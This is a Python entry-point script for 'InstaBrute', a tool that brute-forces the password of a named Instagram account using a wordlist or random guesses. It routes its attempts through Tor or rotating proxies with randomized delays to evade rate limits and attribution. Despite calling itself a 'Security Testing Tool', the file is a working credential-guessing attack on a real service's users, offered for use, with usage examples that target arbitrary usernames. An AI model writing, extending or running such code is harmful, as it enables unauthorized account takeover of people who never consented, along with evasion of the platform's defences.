import argparse
import os
import logging
import asyncio
from brute_force import BruteForce
from proxy_manager import ProxyManager
from tor_manager import TorManager
from monitoring import OperationMonitor
from brute_force import AttackStrategy
from request_manager import RequestManager
from logging_config import setup_logging

logger = setup_logging('instabrute')

def display_banner():
    print("\033[1;32m")
    print("""
██╗   ██╗███████╗██╗  ████████╗██╗  ██╗██████╗  ██████╗ ███╗   ██╗██╗   ██╗██╗  ██╗
██║   ██║╚════██║██║  ╚══██╔══╝██║  ██║██╔══██╗██╔═══██╗████╗  ██║╚██╗ ██╔╝╚██╗██╔╝
██║   ██║    ██╔╝██║     ██║   ███████║██████╔╝██║   ██║██╔██╗ ██║ ╚████╔╝  ╚███╔╝ 
╚██╗ ██╔╝   ██╔╝ ██║     ██║   ██╔══██║██╔══██╗██║   ██║██║╚██╗██║  ╚██╔╝   ██╔██╗ 
 ╚████╔╝    ██║  ███████╗██║   ██║  ██║██║  ██║╚██████╔╝██║ ╚████║   ██║   ██╔╝ ██╗
  ╚═══╝     ╚═╝  ╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝
                                                                                   
                V7lthronyx: Empowering Cyber Awareness
    """)
    print("\033[1;37m")

def validate_file(file_path, description):
    if file_path and not os.path.isfile(file_path):
        logger.error(f"{description} not found at: {file_path}")
        exit(1)
    elif file_path:
        logger.info(f"{description} found: {file_path}")

def show_usage():
    print("\033[1;34m")  
    print("""
Usage:
------
1. Basic Brute Force:
   python instabrute.py --username target_username --password-list passwords.txt

2. Use Tor for Anonymity:
   python instabrute.py --username target_username --password-list passwords.txt --use-tor

3. Use Proxies:
   python instabrute.py --username target_username --password-list passwords.txt --proxy-list proxies.txt
    """)
    print("\033[1;37m")  

def setup_proxy(args):
    if args.proxy_list:
        proxy_manager = ProxyManager(proxy_file=args.proxy_list)
        proxy_manager.validate_all_proxies()
        logger.info("Proxies loaded successfully.")
        return proxy_manager
    return None

def setup_tor(args):
    if args.use_tor:
        logger.info("Using Tor for anonymity...")
        tor_manager = TorManager()
        tor_manager.change_identity_via_control_port(password="your_control_password")

def brute_force_login(args, proxy_manager):
    brute_forcer = BruteForce()
    brute_forcer.brute_force(
        username=args.username,
        password_list=args.password_list,
        timeout=args.timeout,
        use_proxy=proxy_manager is not None,
        threads=args.threads,
    )

def validate_arguments(args):
    errors = []
    
    if not args.username:
        errors.append("Username is required")
        
    if not args.password_list and not args.random:
        errors.append("Either password list or random mode is required")
        
    if args.password_list and not os.path.exists(args.password_list):
        errors.append(f"Password list file not found: {args.password_list}")
        
    if args.proxy_list and not os.path.exists(args.proxy_list):
        errors.append(f"Proxy list file not found: {args.proxy_list}")
        
    if args.threads < 1:
        errors.append("Thread count must be at least 1")
        
    if errors:
        for error in errors:
            logger.error(error)
        return False
    return True

def handle_arguments():
    parser = argparse.ArgumentParser(description="InstaBrute - Instagram Security Testing Tool")
    parser.add_argument("--username", required=True, help="Target Instagram username")
    parser.add_argument("--password-list", help="Path to password list file")
    parser.add_argument("--random", action="store_true", help="Use random password generation")
    parser.add_argument("--timeout", type=int, default=3600, help="Timeout in seconds")
    parser.add_argument("--use-tor", action="store_true", help="Enable Tor for anonymity")
    parser.add_argument("--proxy-list", help="Path to proxy list file")
    parser.add_argument("--threads", type=int, default=1, help="Number of threads")
    parser.add_argument("--min-delay", type=float, default=1.0, help="Minimum delay between requests")
    parser.add_argument("--max-delay", type=float, default=3.0, help="Maximum delay between requests")
    parser.add_argument("--output", default="results.txt", help="Output file for results")
    
    args = parser.parse_args()
    if not validate_arguments(args):
        exit(1)
    return args

async def main():
    display_banner()
    args = handle_arguments()
    
    try:
        monitor = OperationMonitor()
        request_manager = RequestManager(min_delay=args.min_delay, max_delay=args.max_delay)
        brute_forcer = BruteForce()
        
        if args.proxy_list:
            proxy_manager = ProxyManager(proxy_file=args.proxy_list)
            await proxy_manager.initialize_proxies()
            request_manager.set_proxy_manager(proxy_manager)
        
        if args.use_tor:
            tor_manager = TorManager()
            if not tor_manager.ensure_tor_running():
                logger.error("Failed to initialize Tor. Exiting...")
                return
        
        monitor.start_monitoring()
        
        strategy = AttackStrategy.RANDOM if args.random else AttackStrategy.DICTIONARY
        result = await brute_forcer.brute_force(
            username=args.username,
            password_list=args.password_list,
            timeout=args.timeout,
            use_proxy=bool(args.proxy_list),
            threads=args.threads,
            strategy=strategy
        )
        
        monitor.stop_monitoring()
        if result:
            logger.info(f"Attack successful! Results saved to {args.output}")
        else:
            logger.info("Attack completed without finding password")
            
    except KeyboardInterrupt:
        logger.info("\nAttack interrupted by user")
        monitor.stop_monitoring()
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        monitor.stop_monitoring()

if __name__ == "__main__":
    asyncio.run(main())
